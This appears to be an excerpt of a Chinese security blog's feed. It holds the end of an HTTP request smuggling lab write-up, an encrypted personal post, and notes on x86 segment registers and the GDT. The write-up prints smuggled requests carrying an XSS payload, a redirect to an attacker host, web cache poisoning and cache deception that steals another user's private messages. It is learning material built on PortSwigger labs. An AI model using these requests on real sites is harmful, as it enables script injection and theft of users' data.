class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>148</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="makefile">0</span></span><br><span class="line"><span class="makefile"></span></span><br><span class="line"><span class="makefile">GET /post?postId=5 HTTP/1.1</span></span><br><span class="line"><span class="makefile"><span class="section">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span></span><br><span class="line"><span class="makefile"><span class="section">Content-Type: application/x-www-form-urlencoded</span></span></span><br><span class="line"><span class="makefile"><span class="section">Content-Length: 5</span></span></span><br><span class="line"><span class="makefile"></span></span><br><span class="line"><span class="makefile">x=1</span></span><br></pre></td></tr></table></figure><figure><img src="/2022/10/05/2022-10-HTTP/image-20221009220607864.png" alt="image-20221009220607864"><figcaption aria-hidden="true">image-20221009220607864</figcaption></figure><p>之后打开就会弹窗：</p><p><img src="/2022/10/05/2022-10-HTTP/image-20221009220802755.png"></p><h2 id="turn-an-on-site-redirect-into-an-open-redirect">Turn An On-Site Redirect Into An Open Redirect</h2><p>这种攻击场景是在目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache &amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br></pre></td></tr></table></figure><p>会得到这样的响应：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://normal-website.com/home/</span><br></pre></td></tr></table></figure><p>如果配合请求走私：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="vbnet"></span></span><br><span class="line"><span class="vbnet"><span class="keyword">GET</span> /home HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="vbnet"><span class="symbol">Host:</span> attacker-website.com</span></span><br><span class="line"><span class="vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure><p>走私之后的请求会这样：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/home</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker-website.com</span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure><p>服务器如果根据host跳转的话，会有入下响应：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>https://attacker-website.com/home/</span><br></pre></td></tr></table></figure><p>用户请求的是由网站上的页面导入的JS文件。攻击者可以通过在响应中返回他们自己的JS代码来进行其他操作。</p><h2 id="perform-web-cache-poisoning">Perform Web Cache Poisoning</h2><p>web缓存投毒，基于上面host的场景，如果front服务器存在缓存静态资源的话，可以配合http请求走私进行缓存投毒。</p><p>Lab：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。 前端服务器被配置为缓存某些响应。</p><p>为了解决实验室问题，请执行导致缓存中毒的请求走私攻击，以便随后对 JavaScript 文件的请求接收到对漏洞利用服务器的重定向。 中毒的缓存应该提醒 document.cookie。</p></blockquote><p>点击next page的时候会有跳转，这里lab给了我们用于制造投毒的服务，选择在<code>/resources/labheader/js/labHeader.js</code>进行投毒：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221009230351715.png" alt="image-20221009230351715"><figcaption aria-hidden="true">image-20221009230351715</figcaption></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a4d00aa034f37b3c07f0706003000fc.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /post/next?postId=<span class="number">3</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">Host</span>: exploit-<span class="number">0</span>a<span class="number">2</span>a<span class="number">001103</span>fb<span class="number">3720</span>c<span class="number">0</span>e<span class="number">707</span>a<span class="number">401</span>e<span class="number">90038</span>.exploit-server.net</span></span><br><span class="line"><span class="apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="apache"><span class="attribute">Content</span>-Length: <span class="number">10</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">x</span>=<span class="number">1</span></span></span><br></pre></td></tr></table></figure><figure><img src="/2022/10/05/2022-10-HTTP/image-20221009233614419.png" alt="image-20221009233614419"><figcaption aria-hidden="true">image-20221009233614419</figcaption></figure><p>之后访问需要缓存投毒的文件，可以看到已经重定向到投毒的服务器文件了：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221009232332028.png" alt="image-20221009232332028"><figcaption aria-hidden="true">image-20221009232332028</figcaption></figure><p>之后访问主页直接跳转：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221009233546205.png" alt="image-20221009233546205"><figcaption aria-hidden="true">image-20221009233546205</figcaption></figure><h2 id="perform-web-cache-deception">Perform Web Cache Deception</h2><p>缓存欺骗，和上面的缓存投毒差不多，有一点区别。</p><blockquote><p>网络缓存中毒和网络缓存欺骗有什么区别？</p><p>在 Web 缓存中毒中，攻击者使应用程序在缓存中存储一些恶意内容，并将这些内容从缓存中提供给其他应用程序用户。 在网络缓存欺骗中，攻击者使应用程序将属于另一个用户的一些敏感内容存储在缓存中，然后攻击者从缓存中检索这些内容。</p></blockquote><p>比如，如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="vbnet"></span></span><br><span class="line"><span class="vbnet"><span class="keyword">GET</span> /<span class="keyword">private</span>/messages HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="vbnet"><span class="symbol">Foo:</span> X</span></span><br></pre></td></tr></table></figure><p>这个走私的请求会使用<code>Foo: X</code>吃掉下面一个请求的第一行，并且这个请求还会带着用户的 Cookie 去访问，类似于一个CSRF，该请求变成了以下请求头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/private/messages</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>XGET /static/some-image.png HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></table></figure><p>多发送几次后如果用户访问的是静态资源，有一定几率被Front服务器存下来，就可以拿到用户<code>/private/messages</code>的信息了。</p><h1 id="end.">END.</h1><p>花了好久终于写+复现完了，好了好了 ，搞其他东西去了。</p><p>一些参考链接：</p><blockquote><p>https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/</p><p>https://regilero.github.io/tag/Smuggling/</p><p>https://paper.seebug.org/1048/</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;timeline&quot;&gt;TimeLine&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2004年，&lt;code&gt;@Amit Klein&lt;/code&gt; 提出 &lt;a href=&quot;https://dl.packetstormsecurity.net/paper</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="WEB" scheme="https://ghostasky.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>这两年我学到了什么</title>
    <link href="https://ghostasky.github.io/2022/09/28/2022-9-%E8%BF%99%E4%B8%A4%E5%B9%B4%E6%88%91%E5%AD%A6%E5%88%B0%E4%BA%86%E4%BB%80%E4%B9%88/"/>
    <id>https://ghostasky.github.io/2022/09/28/2022-9-%E8%BF%99%E4%B8%A4%E5%B9%B4%E6%88%91%E5%AD%A6%E5%88%B0%E4%BA%86%E4%BB%80%E4%B9%88/</id>
    <published>2022-09-27T16:00:00.000Z</published>
    <updated>2022-09-28T13:49:56.810Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="风中传来苦咸，是悔恨的气味吗?" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="0c2782a21549a5314c3109149a05d04d701011379558c94de7af4173e2229466">f045e053d6254bea7b0b1b710a9b6ff6bab3bfcdfad6dae53d6076793adbd96faeea895c506a6d364e91dcc852f91f1f03b086a96490186e794216642dbbf67046c8dd3f79f1f39f2c1ae6e629d1a67e0a2c1bff107674cb2d403b6070dd68ea92a86f7959652329ae2581c614dcde8d3dd8488da1b468ff0591a6e76f9021d6122c9c314b710c94f22e4695590d405ec68f883819d10bc9234a296c4ad56432ce9944d6ef58ffba890077e234e18a464d74f2e4a9a633755db7f3d62630004567b8eec5f44030a89fe284aef6f8bba681fff0199241c5f0c5420d041424ef29b176e97b36844704ad797859e926dabca1e489691b2bc6397fc27d05e90f607927e325c057511be1a629148ac9e15abc1c7bc0d5db675bd9e2ed075abba168d5e84533b1eda3ba0618cd478017a3ad2a2257e63a68fbe502855dacab0febd18224780a62e2030d0b0bf1c3c94271d45ab2bb645b2fc9aab21e9dd3fd26b6eed5b534d37bf191b2fa3fcd63d4ce3d855dac751dfa3b5ef0282aab4a238aecb9f5bf2423d4755ee1107894bf29bf6bc8b8374f181f23d7e4627d30ca38ddb32fba39c924cee6cd1667756ec5260dee198cae59272f120e3c82ad121c8321197bd848066d94d4a28cb0e43f1cd261bea3a75839004cc0515e5ce1ece5f336cfe506d3f58b16898b9d4a7f5b6652f7eeda4f6a585b37049add4dc9cf2fb1c189a252e74023197e2119e741ef3a0ac92354350ea20017c19cdfc85b8de58fee3164430a24508ae1a0b15b0eaf665077e3c0c1452eddf960d95bc0da98ca86e58b1e020362a46126945b80e0aeceadf133f08cd0b6e93911beb22387bfaa8c36d4a0bdabb7dd8637caa6fa850274f31839641bbf9b43d7b166a1002f55dd7db72c396239f5e247a3777662d1ac58ef09d63c01c212462bd49555a34651d44f91da5603b8fa3ad3ce111626d577f6fd8d9acf0e8e368fa35af5d85e82e02f0e8f4c0a1fe070039ad07c6a6849e35b093093ee4c7cce553c022c70fbbdae8cf9bc9b931016c5e6b1e56dbe9093384e54bc6e443f9657fde893ebbc716f73b55dda34c1fc4c808644c838545be61d226aaa9ba87ca6ecf36c5cdf25989814458e4f895953f0bd4603f7f93a714715ed0efaaec3d88db9c2d539828176c5a01a4e84d917771be085a52d3bd74c052c326e75cd55c70de1809ed7e6b1df0e8a078ec9dc976af60a4080a6811b3485ec17d2d368c272e7a142d6bcfbdfbf3f767bea8e531545024bb68b4bd3dc958906f77a7a0f7043db806c6c6723dfe17103c3b09050dfa4134be59f31d64972fdefff4913cf78e1ab47e002182994d0f61642156f335c604b1b7dd3fafe97f32a6115b4f8b9f8fd226a86dcc633968d7fc84e8d049ceecbff5d552651736ecae4af4a372e0c33d76df73989754151e7138f5bd3f648fa0ec008cf286deafd76f39d3e63255820ebf4dec99f50c59501a92359c242ae83948e652867a991722de3feabcbef913f72f1e4110766e6288e190f0d4263975ac37fb5a5f967137ed5ed9c1463bb8fca9e6c75f7572322cc3fa0a8ef73dc12b020cc3671424cc5f49a82b952c0a8595ae5128b6f2e59a442ec135a4390525a9d07b2950cdcb0d7e4f42e9bb088b1fb30d1d86a229a79d7276cd5b12600dbaa46af87095d1e46f6697ab6019f43221a75bbae60262916ddf7e779e2794dbb7a14f014a665a405d38c2d0d3f66ae25d2da69360a552faaaafb20e401c600e288e5bdeb4d1196a4d162a8a2f24d0f52d530503290b45320f1115d6ebcb588f7232fc1bcc92b32a05b3149c8d3680c6e91d451f64e44e8225e0b8bc0334750a005a68176659f0e67cc56634a644bdbb95ade705e848eef50424db4ac9c7c3ef8976149db2c2d5a08f2605dd5f169a5fe1c5aca48036ef9fae68e435146926d24666ac1efad1202e4c6a1a43fec8e2aa5ad40f3018e87fe7be153057413b95f0931cc5bcfefe2470cb545131d2da0ad8385ceba6d788c62d7daaeaeaf04f3f2296e57f32c36dfcfe308ebbc59b73063ee195db9aa98ee037e12b4659f3e233656b4817883a3e2b96abb2325086a4f9b97d5e8585ca28a10df434b5bbe5b00d99a1a63521a1420841ad312abb8a85b0b6c72631fde811c3cf3a0bae9f7880d8a8047a3e302c7281fbf4dcb9d695bb0fe68034a19e99da10a2971ecc8dac474adabd585f8685accfb8096914b3ab67c30f239e25de292a09ca8f103797fa0932756b9a3f3a62c819ff37270d041b19d467d329330fefa65a8191ed6292435a2c88a1e7cf44ec8a2639b289708af6d1139e6ecb0c6cdc2643c2e7c42e99d6a87b32e6787505f44df10a664b1cdcd921d890edf4d29312be348d041cc42ed6edcfb2096007a051c0489c1bd680c2e6e08f02c29549c5a07bb780e6bde9b969d0b8fab1f8726689a34b4d54c321dc53683cd4d6d1f731109477345b93f5c29f7a83efd77381abaf306c018c6969f63f3c0b23f5238187fd8874c9e0ccd0b62c54894788222cd9be2e63feec9c5df0359a6f2b4fb85f87c4979f564f3a6018d58fe6559ebefff8faa4f8c35bb34a73bb25134689517d325be4a6b14b8c0edcebf550e4bc9468c9f778b4c87b6b0dca0c215d40c730bf593109f1eaf8a651771e7dcc674b990ffe022cfeb426a9b35a3b5edb1e3edef41b1c004ae709a5e9d777723113fb3dc46ebf25744eecdff7feb10f99732790fffbea8dbef58bedf092a92cb17554b5c04cca195a65582ffbe8f8124bced1d2581553ad6550df0782c02c19eabc3d264b92f2183be97caf68a461e12dec4135a358c2ee0d48d93495743f7ed8b3376ea3ac6a8be01b56f677e48a18799a5ffe94520d80e07fe0620a96c5acbb423db2b9215aea14f43c3042e2ff4f24062980eb1573c9cdda63c23b3097cf285609bb7a66ef3b6a8feed1db03a21c7ea237c6f7df905e753eef6dd5a27242973d56dadca37f77ebd35593d766e986a32cee7c60c246dbcd2e693a9547d0d17e195275bba0d2422d19de43c13e333b70d98cfc056708aa9e5e7329ae4034f6380fa7e779e4d531be6affc61ce64a3913097d5857f290bdaf2246c19ebb6e80d76c77c4729e80b895797d96b6a9377d87e491deaa446c57919a81107028ba6d077c0d6ef5167c11afdc5442532441fe4e451dd4a553276b9133cb14d524ec80f0163168a79254a7dfbe37086cc23b6b096342c5614b9c46a0cd63f2f23d4deb57eb2bd638a977bff1a35808b394f419f41a5e194170cc1e3ab9dbf362b4ef6cc9f42beedb341abedb94f34e6328d0f04762c239184c2605ffc818e8be5712da1fec1e6037ef53073f96aa9629146797ec1e5f72029bf6119a9c97da9f925dba0df91ad7fbfda34e0a07635f016cbe94099777fb9fc24a2b7ea8b3807186af1dbd68f160cc2c0dc4a85d02e280743f12e61c7675fcbab6c5aadbe2783ec4cf5c5975076914a61c62e32691ca7f6f026ac05ec7efa0a19d114222a4cab4880d6142e8961711e7cdde70206a3eac9bc719fde2c0446e96e69b6d79ad7bf1f60da012c25f2990085820e75fd21227cc42bf5f5988efd1a3d7422b4720c249b968151689295ea8dbd0fcaccd934947515e49c26277dfa6d782b1762c8b0c7f407e23558e432c6769a1632a505742fac22336809f04a27337f11356c81c38e2c92b3a9c44a6b4695a04d3c7a366de2ae525b4e45f9f529dfdaa978ed046ba44d51a4449aa69c8200b5820f3fd52b39c1846dfa494d3cbd192e3c72d9067a448b06ce9d02a84168720dbcf36b79a97db68fdaa9730f8f7f388fd5fa950e526b2457c9d2a1de2c451a8ee6b80975837b5a4584eeb815cff133f9b3bcbb5f4524aa900ff05707a2bffa1f3f34b89763ae70aff9cb8e997bcabb48e96c5ca119e30cd4543a2ad94f5b0a0b5167ccc2accd374de46d96efd16fd80784b443dceac37e6e54bb765e8007cdf8026d8adb56048a111468b5dcc6d683f82dc63e36afd7a10c0a55f99d7a597b8b8e0871c8dc04ec3a45b4c37cb1d0c09da7882bd40d9b902fdc12b22a1d7cccdc2d2bd0170ff98cc3f723ddd42a5a95826d60e1dc49a53df3ee2884edd93965</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">坟墓里寂静无比，埋葬你的是所有你没说出口的话</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">坟墓里寂静无比，埋葬你的是所有你没说出口的话</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Windows保护模式</title>
    <link href="https://ghostasky.github.io/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>https://ghostasky.github.io/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</id>
    <published>2022-09-25T16:00:00.000Z</published>
    <updated>2022-09-26T14:36:35.439Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="001-保护模式"><a href="#001-保护模式" class="headerlink" title="001.保护模式"></a>001.保护模式</h1><p>x86CPU三个模式：实模式， 保护模式，虚拟8086模式</p><p>市面上能见到的x64对x86向下兼容，是x86的扩展</p><p>保护模式特点：</p><ul><li>段的机制</li><li>页的基址</li></ul><h1 id="002-段寄存器结构"><a href="#002-段寄存器结构" class="headerlink" title="002.段寄存器结构"></a>002.段寄存器结构</h1><p>学段机制之前先要知道段寄存器结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ds:[0x123456],eax</span><br><span class="line">实际上读的地址是：ds.base + 0x123456</span><br></pre></td></tr></table></figure><p>段寄存器共8个：</p><p><code>ES,CS,SS,DS,FS,GS,LDTR,TR</code></p><blockquote><p>  LDRT在win中不用</p></blockquote><p>段寄存器共96位，其中高80位不可见，低16位可见</p><p>段寄存器在读的时候只能读16位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ax,es//也就是Selector部分</span><br></pre></td></tr></table></figure><h1 id="003-段寄存器属性探测"><a href="#003-段寄存器属性探测" class="headerlink" title="003.段寄存器属性探测"></a>003.段寄存器属性探测</h1><p>寄存器的96位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Selector//16，可见部分</span><br><span class="line">Atrribute//16</span><br><span class="line">Base//32</span><br><span class="line">Limit//32</span><br></pre></td></tr></table></figure><p><strong>LDTR和TR寄存器不能使用mov读写</strong></p><p>不同系统红色部分可能不同： </p><p>GS寄存器win没有使用</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926221649224.png"></p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220705133725810.png"></p><h1 id="004-段描述符与段选择子"><a href="#004-段描述符与段选择子" class="headerlink" title="004.段描述符与段选择子"></a>004.段描述符与段选择子</h1><p>介绍两张表：GDT(全局描述符表)和LDT(局部描述符表，该表在win并没有使用)</p><p>当执行类似mov ds,ax指令时，cpu会查表，</p><p>主要是查GDT表。</p><p>本来要是用32的，这里使用x64来演示，其实都差不多：</p><p>gdtr和gdtl 分别可以知道gdt这个表的位置和大小，dd指令可以查看指定位置的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; r gdtr</span><br><span class="line">gdtr=fffff8023406afb0</span><br><span class="line">0: kd&gt; r gdtl</span><br><span class="line">gdtl=0057</span><br><span class="line">0: kd&gt; dd fffff8023406afb0</span><br><span class="line">fffff802`3406afb0  00000000 00000000 00000000 00000000</span><br><span class="line">fffff802`3406afc0  00000000 00209b00 00000000 00409300</span><br><span class="line">fffff802`3406afd0  0000ffff 00cffb00 0000ffff 00cff300</span><br><span class="line">fffff802`3406afe0  00000000 0020fb00 00000000 00000000</span><br><span class="line">fffff802`3406aff0  90000067 34008b06 fffff802 00000000</span><br><span class="line">fffff802`3406b000  00003c00 0040f300 00000000 00000000</span><br><span class="line">fffff802`3406b010  00000000 00000000 00000000 00000000</span><br><span class="line">fffff802`3406b020  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220705143157265.png"></p><blockquote><p>  换成32位xp后：</p></blockquote><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220915155154854.png"></p><p>段描述符，一个段描述符有8字节，查看段描述符一般使用dq查看，即qword，如上图</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220409162131390.png"></p><p>段选择子：16位的端描述符，</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220926221614422.png"></p><p>除了MOV指令，我们还可以使用LES、LSS、LDS、LFS、LGS指令修改寄存器.<br>CS不能通过上述的指令进行修改，CS为代码段,CS的改变会导致EIP的改变，要改CS，必须要保证CS与EIP一起改，后面会讲.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buffer[<span class="number">6</span>];</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">les ecx,fword ptr ds:[buffer] <span class="comment">//高2个字节给es，低四个字节给ecx</span></span><br><span class="line">    <span class="comment">//fword 为6字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意:RPL&lt;&#x3D;DPL(在数值上)，上述指令才能运行</p><p>DPL：描述符特权级</p><h2 id="使用LES指令修改ES"><a href="#使用LES指令修改ES" class="headerlink" title="使用LES指令修改ES"></a>使用LES指令修改ES</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="comment">// RPL &lt;= DPL</span></span><br><span class="line"><span class="comment">// Selector: 0000 0000 0011 1000(0038)</span></span><br><span class="line"><span class="comment">// LES高2字节给ES，低4字节给ECX，其他指令如LSS,LDS依此类推</span></span><br><span class="line"><span class="comment">// RPL是段选择子的权限，DPL是段描述符的权限，数值越大权限越小</span></span><br><span class="line"><span class="comment">// 因此当RPL=3时，只能访问DPL=3的段描述符；当RPL=0时，可以访问所有段描述符</span></span><br><span class="line"><span class="comment">// 下面的buffer作为源操作数执行les指令，会把ES写为0x0038，EAX写为0x11223344</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">6</span>] = &#123;<span class="number">0x44</span>,<span class="number">0x33</span>,<span class="number">0x22</span>,<span class="number">0x11</span>,<span class="number">0x38</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// LES修改段寄存器</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">les ecx,fword ptr ds:[buffer]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到ECX和ES被修改：</p><p><img src="/2022/09/26/2022-9-WinKernel%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/image-20220925124839590.png"></p><h1 id="005-段描述符属性：P位和G位"><a href="#005-段描述符属性：P位和G位" class="headerlink" title="005.段描述符属性：P位和G位"></a>005.段描述符属性：P位和G位</h1><p>P&#x3D;1：段描述符有效，0为无效</p><p>G位：</p><ul><li>当G&#x3D;0时，Limit的范围是<code>0x00000000-0x000FFFFF</code>，其中，段描述符的20位在低位，高位补0.</li><li>当G&#x3D;1时，Limit的范围是<code>0x00000FFF-0xFFFFFFFF</code>，其中，段描述符的20位在高位，低位补F。</li></ul><p>段寄存器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Selector//16,段选择子（已确定）</span><br><span class="line">Atrribute//16，高32位中的：8--23位</span><br><span class="line">Base//32，有三部分，在上面的图都能找到</span><br><span class="line">Limit//32，上面有20位，也就是最多FFFFF,当G=0时，单位为字节，那么0x000FFFFF；当G=1时，单位为4KB，0xFFFFFFFF</span><br></pre></td></tr></table></figure><p>目前不要使用FS，FS与线程相关。</p><h2 id="练习：从GTD表中查找对应的段描述符，然后填充到段寄存器中。"><a href="#练习：从GTD表中查找对应的段描述符，然后填充到段寄存器中。" 